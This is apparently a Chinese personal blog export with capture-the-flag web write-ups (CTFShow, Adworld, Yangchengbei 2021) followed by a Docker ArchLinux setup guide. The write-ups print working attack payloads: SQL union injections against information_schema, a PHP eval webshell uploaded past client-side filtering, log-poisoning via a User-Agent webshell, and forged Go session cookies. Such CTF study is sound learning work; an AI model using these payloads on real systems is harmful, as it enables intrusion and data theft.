<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%201.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%201.png"></p>
<p>F12，藏在返回头部</p>
<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>访问 /robots.txt 获得内容</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /flagishere.txt</span><br></pre></td></tr></table></figure>

<p>再访问 /flagishere.txt 获得flag</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%202.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%202.png"></p>
<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%203.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%203.png"></p>
<p>题目提示 phps 源码泄漏，访问 /index.phps 试试</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%204.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%204.png"></p>
<p>获得flag</p>
<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>题目提示 <code>解压源码到当前目录，测试正常，收工</code></p>
<p>一般运维会将网站目录压缩为 <a href="http://www.zip/">www.zip</a> ，访问后获得压缩包</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%205.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%205.png"></p>
<p>解压获得flag</p>
<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p><code>版本控制很重要，但不要部署到生产环境更重要。</code></p>
<p>关键词：版本控制，访问 /.git/</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%206.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%206.png"></p>
<p>直接获得flag</p>
<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>要求同上，版本控制一般有 .git 或者 .svn， 访问.svn</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%207.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%207.png"></p>
<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p>关键词：vim</p>
<p>vim 在未正常关闭的时候会生成 .swp 文件</p>
<p>访问 /index.php.swp</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%208.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%208.png"></p>
<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>关键词：cookie</p>
<p>使用 editthiscookie 打开查看得</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%209.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%209.png"></p>
<h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p>关键词：域名隐藏信息</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">[root@Kelly ~]# nslookup </span><br><span class="line">&gt; set type=TXT</span><br><span class="line">&gt; ctfshow.com</span><br><span class="line"><span class="attr">Server</span>:         <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"><span class="attr">Address</span>:        <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>#<span class="number">53</span></span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">ctfshow.com     text = <span class="string">&quot;flag&#123;just_seesee&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">Authoritative answers can be found <span class="keyword">from</span>:</span><br><span class="line">&gt; exit</span><br></pre></td></tr></table></figure>

<h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p>访问 /robots.txt 获得内容</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: <span class="regexp">/admin/</span></span><br></pre></td></tr></table></figure>

<p>访问 /admin </p>
<p>他404</p>
<p>把我整不会了</p>
<h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2010.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2010.png"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2011.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2011.png"></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2012.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2012.png"></p>
<h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><p>提示中说明了 editor 翻找源代码发现有个/editor/uploads/xxx.png ，发现 /editor 可以直接访问</p>
<p>访问后点击上传附件按钮，点击文件空间</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2013.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2013.png"></p>
<p>发现 /var/www/html/nothinghere 存在文件 /fl000g.txt</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2014.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2014.png"></p>
<p>根据路径访问，获得flag</p>
<h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><p>在网页底部获得邮箱 <a href="mailto:1156631961@qq.com">1156631961@qq.com</a> ，qq号查询发现是西安的</p>
<p>访问 /admin 忘记密码，填写西安，重置密码获得flag</p>
<h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><p>访问 /tz.php ,点击phpinfo搜索flag</p>
<h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><p>在控制台直接修改score，访问 /110.php 获得flag</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2015.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2015.png"></p>
<h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><p>方向错了方向错了，我还想着我怎么解密呢，原来这题不用解密</p>
<p>右键查看源代码，获取用户名和加密后的密码，填入输入框，在控制台输入$(“#loginForm”).submit(); 获取flag</p>
<h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><p>这题没经验是真不会</p>
<p>早期access存放路径 /db/db.mdb，访问后搜索</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2016.png" alt="CTF-Show-Get-Started-with-the-web-collect-info/Untitled%2016.png"></p>
<h1 id="错漏补充"><a href="#错漏补充" class="headerlink" title="错漏补充"></a>错漏补充</h1><ul>
<li><p>信息收集——装一些插件（待补充），写工具（知识武器化），写 CheckList</p>
</li>
<li><p>vim会产生 .swp / .swo / .swn ，gedit会产生 文件名～的备份文件名</p>
</li>
<li><p>webpack的反编译</p>
</li>
<li><p>svn信息泄漏工具 SvnExploit</p>
</li>
<li><p>Apache的php解析漏洞（CVE-2017-15715），上传文件gif文件头后路径结尾为 .php/ 可以使用</p>
</li>
<li><p>替换关键文件使用mv来覆盖</p>
</li>
<li><p>HTTP协议头部，常见的字段</p>
</li>
<li><p>搞安全的整个昵称</p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术篇</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>菜鸡 CTF 之旅 Writeup （攻防世界）</title>
    <url>/archives/CTF-Writeup-adworld.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我是个菜鸡，菜鸡就要先走新手练习区。</p>
<p>这次 CTF Writeup 的指定训练站点为 <a href="https://adworld.xctf.org.cn/">攻防世界</a></p>
<span id="more"></span>

<h1 id="新手练习区"><a href="#新手练习区" class="headerlink" title="新手练习区"></a>新手练习区</h1><h2 id="Web-区"><a href="#Web-区" class="headerlink" title="Web 区"></a>Web 区</h2><h3 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h3><p>题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。</p>
<p>解答步骤：直接在地址栏前加上 view-source: 拿到 HTML 注释中的</p>
<pre><code>cyberpeace&#123;f3baff125*********f3cf5a7e6&#125;
</code></pre>
<h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>解答步骤：地址栏后加上 /robots.txt ，得到</p>
<pre><code>User-agent: *
Disallow: 
Disallow: f1ag_1s_h3re.php
</code></pre>
<p>访问 /f1ag_1s_h3re.php 得到 flag </p>
<h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>解答步骤：访问 index.php.bak，记事本打开得 flag</p>
<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>解答步骤：查看 cookie 看到要求访问 cookie.php，要求查看http response，看response header得到flag</p>
<h2 id="MISC-区"><a href="#MISC-区" class="headerlink" title="MISC 区"></a>MISC 区</h2><h3 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this is flag"></a>this is flag</h3><p>题目描述：Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}</p>
<p>解答步骤：直接填入 flag{th1s_!s_a_d4m0_4la9}</p>
<h3 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h3><p>题目描述：菜猫给了菜狗一张图，说图下面什么都没有</p>
<p>附件：一份 PDF</p>
<p>解答步骤：我一开始还想用 Word 转换 PDF 再尝试的，结果发现 Word 转换后字没了，然后试了一下 Ctrl+A，发现获取到文字，Ctrl+C 拿到 flag{security_through_obscurity}</p>
<p><img data-src="/images/Article/CTF-Writeup/pdf.png" alt="/images/Article/CTF-Writeup/pdf.png"></p>
<p><del>果然 Ctrl+A 和 Ctrl+C 是人类第一生产力</del></p>
<h3 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h3><p>题目描述：菜狗为了打败菜猫，学了一套如来十三掌。</p>
<p>题目附件：一份 word 文档</p>
<p><del>打开文档可以看到很多个呐，由此我们可以断定这个是一个二次元 word 档（不是</del></p>
<pre><code>夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮
</code></pre>
<p><img data-src="/images/Article/CTF-Writeup/word-na.png" alt="/images/Article/CTF-Writeup/word-na.png"></p>
<p>没有思路，所以上网一搜，找到了解码站 <a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a></p>
<p>复制内容粘贴到下方解码框，发现提示：太深奥了，参悟不出佛经的真意……</p>
<p>于是随意输入文本，加密后出现开头 “佛曰：”，添加后再次解密</p>
<p>获得一串字符串</p>
<p><img data-src="/images/Article/CTF-Writeup/tudoucode.png" alt="/images/Article/CTF-Writeup/tudoucode.png"></p>
<p><del>上网随意找一个 Rot13 解密工具</del></p>
<p>这玩意还真不能随便找，要找一个不会全部替换为小写的用，不然的话搞半天就白搞</p>
<p>解密后得</p>
<pre><code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9
</code></pre>
<p>得到 flag</p>
<pre><code>flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;
</code></pre>
<h1 id="高手进阶区"><a href="#高手进阶区" class="headerlink" title="高手进阶区"></a>高手进阶区</h1><h2 id="Web-区-1"><a href="#Web-区-1" class="headerlink" title="Web 区"></a>Web 区</h2><h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>访问 /robots.txt 要求访问 /fl0g ，访问获得flag</p>
<h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>F12 访问 /  看 response header 得到 flag</p>
<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>这题。。。实属没思路，直接复制上网找题，发现是经过修改的，而且改得都找不出来</p>
<p>地址栏改为 /index.phps ，发现源码</p>
<pre><code>&lt;?php
// 不允许字符串直接等于 admin
if(&quot;admin&quot;===$_GET[id]) &#123;
  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
  exit();
&#125;
// URLDecode 后又要等于 admin
$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == &quot;admin&quot;)
&#123;
  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;
&#125;
?&gt;

Can you anthenticate to this website?
</code></pre>
<p>所以知道要将 admin 进行 encode 一下，得 %2561%2564%256d%2569%256e</p>
<p>访问 /index.php?id=%2561%2564%256d%2569%256e</p>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>题目内容如下</p>
<pre><code>&lt;?php
$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;

function encode($str)&#123;
    $_o=strrev($str);
    // echo $_o;
        
    for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;
       
        $_c=substr($_o,$_0,1);
        $__=ord($_c)+1;
        $_c=chr($__);
        $_=$_.$_c;   
    &#125; 
    return str_rot13(strrev(base64_encode($_)));
&#125;

highlight_file(__FILE__);
/*
   逆向加密算法，解密$miwen就是flag
*/
?&gt;
</code></pre>
<p>由代码可知，从底下开始，按照 str_rot13、strrev、base64_decode 的顺序进行逐级解密，得 ~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg ，观察中间 for 循环可以发现就是将其转为整数类型再往后移一位，眼尖的看解密后的可以直接看出来是类似于 flag:{ 一类的东西。</p>
<p>按照其代码<del>(和变量风格)</del>可以反向写出</p>
<pre><code>&lt;?php
function decode($pass)&#123;
    $_o =  base64_decode(strrev(str_rot13($pass)));
    
    $_ = &#39;&#39;;
    
        for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;
           
            $_c=substr($_o,$_0,1);
            $__=ord($_c)-1;
            $_c=chr($__);
            $_=$_.$_c;   
        &#125; 
</code></pre>
<p>​<br>        return strrev($_);<br>    }</p>
<pre><code>echo decode(&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;); // flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;
?&gt;
</code></pre>
<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>打开出现一个框，输入 ‘ 后报 500 错误</p>
<p>输入 </p>
<pre><code>&#39; union select 1,2,3 #
</code></pre>
<p>后 News 出现 2 | 3，输入</p>
<pre><code>&#39; union select 1,TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES #
&#39; union select 1,TABLE_NAME,COLUMN_NAME from information_schema.COLUMNS #
</code></pre>
<p>分别可得知 1 中包含关键词 news, secret_table，2 中包含关键词 secret_table, fl4g，即存在一个 secret_table 表在 news 数据库中，同时在 secret_table 又有一个 fl4g 的字段，最后输入</p>
<pre><code>&#39; union select 1,&#39;2&#39;,fl4g from secret_table #
</code></pre>
<p>可得 flag</p>
<h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><p>进入网站，上传图片发现问题木大，且有详细路径，上传 .php 发现被拦截，查看源代码发现是前端拦截，遂直接去掉 js 重新上传，内容</p>
<pre><code>&lt;?php
    eval($_GET[&#39;cmd&#39;]);
?&gt;
</code></pre>
<p>上传成功，显示路径，访问 </p>
<pre><code>/upload/1579158279.a.php?cmd=print_r(scandir(__DIR__ . &#39;/../&#39;), false);

# Output
Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.html [4] =&gt; index.php [5] =&gt; install.sh [6] =&gt; upload )
</code></pre>
<p>​<br>    /upload/1579158279.a.php?cmd=echo file_get_contents(<strong>DIR</strong> . ‘/../flag.php’);</p>
<pre><code># Output
&lt;?php
$flag=&quot;cyberpeace&#123;a87d78****************d3da76&#125;&quot;;
?&gt;
</code></pre>
<p>得到 flag</p>
<h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>输入 <a href="http://localhost/">localhost</a> 后发现出现一个 ICMP 请求，似乎没什么用</p>
<p>陆续输入 ;ls 之类的以后发现提示 invaild URL</p>
<p>输入一个不和谐的 emoji 以后弹出报错信息</p>
<p><img data-src="/images/Article/CTF-Writeup/cat.png" alt="/images/Article/CTF-Writeup/cat.png"></p>
<p>根据 <a href="https://www.php.net/manual/zh/function.curl-setopt.php">https://www.php.net/manual/zh/function.curl-setopt.php</a> </p>
<p><img data-src="/images/Article/CTF-Writeup/cat-php-curl.png" alt="/images/Article/CTF-Writeup/cat-php-curl.png"></p>
<p>输入 @ 可以传递文件，输入 @/opt/api/dnsapi/utils.py 出 invaild URL，输入 @/opt/api/database.sqlite3 出报错信息，搜索 CTF 得到flag</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>瞎搞</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯2021-网络安全大赛 Web Writeup</title>
    <url>/archives/CTF-Yang-Cheng-Bei-2021-Web-WriteUp.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>签到完毕就算成功</p>
<h1 id="Checkin-Go"><a href="#Checkin-Go" class="headerlink" title="Checkin_Go"></a>Checkin_Go</h1><p>这题还真是够 checkin 的。。。</p>
<p>首先注意到，在main.go 这里，Go中的 randomChar 并没有设定随机种子，所以实际上是伪随机，程序开始时的 <code>cookie.NewStore(randomChar(16))</code> 其实是固定的。</p>
<p>在 loginGetHandler 这里，注意到有一句 <code>hsh := hashProof()</code> ，实际上是在此设定了登录所需的 hash。同时，我们再来看这个代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">func hashProof() string &#123;</span><br><span class="line">	hsh := md5.New()</span><br><span class="line">	hsh.Write(randomChar(<span class="number">6</span>))</span><br><span class="line">	<span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, hsh.Sum(nil))[:<span class="number">6</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里也是没有设定随机种子的，这就意味着我们可以对其进行猜测。比如网站给出的前缀是 <code>8240ba</code>，我们可以写这样一个小程序来碰撞。此处输出的是十六进制的字符串，我们在post的时候要注意把字符串进行 urlencode ，这里使用 %隔两个填充一次即可。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">hsh := md5.New()</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		hsh.Reset()</span><br><span class="line">		str := randomChar(<span class="number">6</span>)</span><br><span class="line">		hsh.Write(str)</span><br><span class="line">		hash1 := fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, hsh.Sum(nil))</span><br><span class="line">		<span class="keyword">if</span> hash2 := hash1[:<span class="number">6</span>]; hash2 == <span class="string">&quot;8240ba&quot;</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%x&quot;</span>, str)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>注意，在 <code>auth := r.Group(&quot;/auth/&quot;,hashProofRequired())</code> 中有个判断，</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> md5Hash(c.PostForm(<span class="string">&quot;hsh&quot;</span>))[:<span class="number">6</span>] != hsh &#123;</span><br><span class="line">	fmt.Println(hsh)</span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;wrong hash&quot;</span>)</span><br><span class="line">	c.Abort()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要post的是hsh的原文而不是md5加密后的，所以我们上面才要进行urlencode。</p>
<p>这里并没有进行登录账号密码验证，但是限制非admin的验证，所以我们先随意用户登录。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> uname == <span class="string">&quot;admin&quot;</span>&#123;</span><br><span class="line">	c.String(<span class="number">200</span>,<span class="string">&quot;noon,you cant be admin&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> uname == <span class="string">&quot;&quot;</span> || <span class="built_in">pwd</span> == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;empty parameter&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>登录完成后会跳转到 /game ，同时我们在 <code>guess.go/start()</code> 中将会获得flag以及player的money，并会写入到 <code>cookie: o</code> 中。</p>
<p>这里提供了 /add 来添加钱，不过实际上我们并不需要用到这个钱，而且这个钱是加在flag上的，很明显flag的钱够多了，我们不需要加在flag上。而且其中有一个 check 来检查，我们似乎无法直接修改其金钱。但是我们可以自己构造一个小程序，把 playerMoney 和 NowMoney 调换一下。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">r</span> := gin.Default()</span><br><span class="line">storage := cookie.NewStore(randomChar(<span class="number">16</span>))</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;o&quot;</span>, storage))</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, func(c *gin.Context) &#123;</span><br><span class="line">	s := sessions.Default(c)</span><br><span class="line">	s.Set(<span class="string">&quot;uname&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">	checkPlayerMoney := s.Get(<span class="string">&quot;checkPlayerMoney&quot;</span>)</span><br><span class="line">	checkNowMoney := s.Get(<span class="string">&quot;checkNowMoney&quot;</span>)</span><br><span class="line">	s.Set(<span class="string">&quot;checkNowMoney&quot;</span>, checkPlayerMoney)</span><br><span class="line">	s.Set(<span class="string">&quot;checkPlayerMoney&quot;</span>, checkNowMoney)</span><br><span class="line">	playerMoney := s.Get(<span class="string">&quot;playerMoney&quot;</span>)</span><br><span class="line">	nowMoney := s.Get(<span class="string">&quot;nowMoney&quot;</span>)</span><br><span class="line">	s.Set(<span class="string">&quot;nowMoney&quot;</span>, playerMoney)</span><br><span class="line">	s.Set(<span class="string">&quot;playerMoney&quot;</span>, nowMoney)</span><br><span class="line">	s.Save()</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:8081&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后拿到返回的 cookie，再传给线上环境，访问 /game 并购买 flag 得到 flag。</p>
<h1 id="only4"><a href="#only4" class="headerlink" title="only4"></a>only4</h1><p>我估计这题是个非预期解，，，</p>
<p>这题本质是想让你走反序列化的，但是拿到 webshell 以后上去一看，好家伙 serialize.php 这文件名谁能猜得出来？</p>
<p><code>include($gwht);</code> 中存在文件引用，</p>
<p>在 /var/www/example.com/log/access.log 中，或者 /proc/self/fd/8 可以获得访问日志，然后 User-Agent 改为 <code>&lt;?php eval($_POST[0]); ?&gt;</code> 即可实现一句话木马拿到 webshell 。flag 在根目录。</p>
]]></content>
      <categories>
        <category>技术篇</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>在 Docker 上使用 ArchLinux 容器</title>
    <url>/archives/Docker-ArchLinux.html</url>
    <content><![CDATA[<p>（此处纯果果瞎捣鼓，不一定会规范</p>
<h1 id="瞎-BB"><a href="#瞎-BB" class="headerlink" title="瞎 BB"></a>瞎 BB</h1><p>朋友服务器是 Ubuntu ，没法捣鼓 ArchLinux 很不舒服，加上朋友服务器也莫 VNC，之前不小心给它硬核安装 ArchLinux 装挂过一次，其实之前在自己那台上搭过，也就当玩具玩玩图个乐~</p>
<span id="more"></span>

<blockquote>
<p>参考资料： [在 Docker 中使用 Archlinux 的折腾记录 | Mogeko`s Blog](<a href="https://mogeko.me/2019/063/">https://mogeko.me/2019/063/</a>)</p>
</blockquote>
<p>emm 这里已经有大佬打包过了，那就不重复造轮子了</p>
<p>之前用的是 U2FsdGVkX1 的 <a href="http://github.com/u2fsdgvkx1/archlinux-ssh">archlinux-ssh</a> ，但是已经两年没有过更新了，而且之前滚过一次也没法使用，也忘了有什么原因，所以就用了 mogeko 的 <a href="https://hub.docker.com/r/mogeko/archlinux">mogeko/archlinux</a>。</p>
<p>然后 docker-compose 真的是太方便辣，然后下文就以 docker-compose 为主</p>
<h1 id="Docker-Compose-操作"><a href="#Docker-Compose-操作" class="headerlink" title="Docker Compose 操作"></a>Docker Compose 操作</h1><h2 id="安装-Docker-和-Docker-Compose"><a href="#安装-Docker-和-Docker-Compose" class="headerlink" title="安装 Docker 和 Docker Compose"></a>安装 Docker 和 Docker Compose</h2><pre><code>pacman -S docker.io docker-compose # ArchLinux
apt install docker docker-compose # Ubuntu
# 其他参考资料：https://docs.docker.com/compose/install/
</code></pre>
<h2 id="docker-compose-yml-内容"><a href="#docker-compose-yml-内容" class="headerlink" title="docker-compose.yml 内容"></a>docker-compose.yml 内容</h2><pre><code>version: &quot;3&quot;

services:
  archlinux:
    container_name: archlinux
    image: mogeko/archlinux:latest
    ports:
      - &quot;2223:22/tcp&quot;
    environment:
      TZ: &#39;Asia/Shanghai&#39;

    restart: always
</code></pre>
<p>然后走一手 docker-compose up -d 就可以了。</p>
<p>如果出现无法连接到 unix:///var/run/docker.sock 的，先检查一手是否 root 权限，即 sudo 一波，再看看 dockerd 有没有开，systemctl start dockerd 一手。</p>
<p>然后 docker-compose.yml 我好像暂时没找到 rename docker 的方法（小声</p>
<pre><code>sudo docker ps | grep archlinux
# 76983db2c6f2        mogeko/archlinux:latest          &quot;/usr/bin/sshd -D&quot;       6 days ago          Up 35 hours             0.0.0.0:2223-&gt;22/tcp                                                          archlinux
sudo docker exec -it 7698 bash
[root@76983db2c6f2 /]#
# 然后走一手 passwd 重置一下密码就可以 ssh root@localhost -p2223 连接啦
</code></pre>
<h1 id="开始瞎皮"><a href="#开始瞎皮" class="headerlink" title="开始瞎皮"></a>开始瞎皮</h1><p>注：以下内容极有可能严重不规范，真的真的真的仅为果果瞎捣鼓玩的</p>
<h2 id="映射目录"><a href="#映射目录" class="headerlink" title="映射目录"></a>映射目录</h2><p>emm 由于 docker 重启就清内容的特性，然后我又想捣鼓个不丢数据的，又可以方便直接读取修改的，于是就开始疯狂映射</p>
<p>刚开始尝试了直接将 ./data 目录直接映射到 docker 中的 / ，后来发现 docker 不允许将路径直接映射为 docker 的根目录，于是便开始一个个文件夹地映射。</p>
<p>先运行 docker-compose down ，往 docker-compose.yml 中添加</p>
<pre><code>volumes:
      - &#39;./data/backup:/backup&#39;
</code></pre>
<p>再 docker-compose up -d，打开 bash</p>
<p>将以下文件夹打包，复制到 /backup 中</p>
<pre><code>bin   etc    lib    mnt  run   srv   tmp  var
boot  home   lib64  opt  root  sbin  sys  usr
</code></pre>
<p>将 ./data/backup 打包文件移动到 ./data 解包，并修改 docker-compose.yml 最终为</p>
<pre><code>version: &quot;3&quot;

services:
  archlinux:
    container_name: archlinux
    image: mogeko/archlinux:latest
    ports:
      - &quot;2223:22/tcp&quot;
    environment:
      TZ: &#39;Asia/Shanghai&#39;
    volumes:
      - &#39;./data/bin:/bin&#39;
      - &#39;./data/boot:/boot&#39;
      - &#39;./data/etc:/etc&#39;
      - &#39;./data/home:/home&#39;
      - &#39;./data/lib:/lib&#39;
      - &#39;./data/lib64:/lib64&#39;
      - &#39;./data/mnt:/mnt&#39;
      - &#39;./data/opt:/opt&#39;
      - &#39;./data/root:/root&#39;
      - &#39;./data/run:/run&#39;
      - &#39;./data/sbin:/sbin&#39;
      - &#39;./data/srv:/srv&#39;
      - &#39;./data/sys:/sys&#39;
      - &#39;./data/tmp:/tmp&#39;
      - &#39;./data/usr:/usr&#39;
      - &#39;./data/var:/var&#39;
    restart: always
</code></pre>
<p>重启，然后就能暴力地获得一台重启不掉数据的容器啦，顺便还能直接丢东西进去（逃</p>
<p>我觉得<del>应该有</del>肯定有更优雅的方法的（小声逼逼</p>
<h2 id="Docker-互相连接"><a href="#Docker-互相连接" class="headerlink" title="Docker 互相连接"></a>Docker 互相连接</h2><p>emm 有时候 docker 之间网络不互通，交流起来不方便，开一个网络，大家连进来，就可以几个 archlinux 互相连着玩啦（不是</p>
<h3 id="创建一个新网络"><a href="#创建一个新网络" class="headerlink" title="创建一个新网络"></a>创建一个新网络</h3><pre><code>docker network create my-net
</code></pre>
<h3 id="将-Docker-Compose-中的-Docker-连接到新建的外部网络"><a href="#将-Docker-Compose-中的-Docker-连接到新建的外部网络" class="headerlink" title="将 Docker Compose 中的 Docker 连接到新建的外部网络"></a>将 Docker Compose 中的 Docker 连接到新建的外部网络</h3><p>先 docker-compose down，编辑 docker-compose.yml，在 services: archlinux: 下加入</p>
<pre><code>networks:
   - my-net
</code></pre>
<p>注意 networks 与上面的 restart 对齐，对不齐的买把游标卡尺自己量</p>
<p>在文件最下面加入</p>
<pre><code>networks:
    my-net:
        external:
            name: my-net
